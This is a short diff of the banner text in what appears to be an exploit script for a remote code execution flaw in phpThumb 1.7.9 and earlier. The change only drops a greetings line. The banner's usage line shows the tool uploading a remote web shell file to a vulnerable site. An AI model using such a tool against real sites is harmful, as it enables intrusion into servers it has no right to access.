@@ -18,7 +18,7 @@ banner = """
                                          
 ► phpThumb version <= 1.7.9 (RCE)
 ► Automatic file upload                                    
-► Coded 4Study by: Brndsk // Greetz: spy_unkn0wn - sky - unyl
+► Coded 4Study by: Brndsk 
 ► Github: github.com/brndsk
 
 ► Use: xpl.py --shell http://www.site.co/shell.txt --url http:/vuln.com/phpThumb/
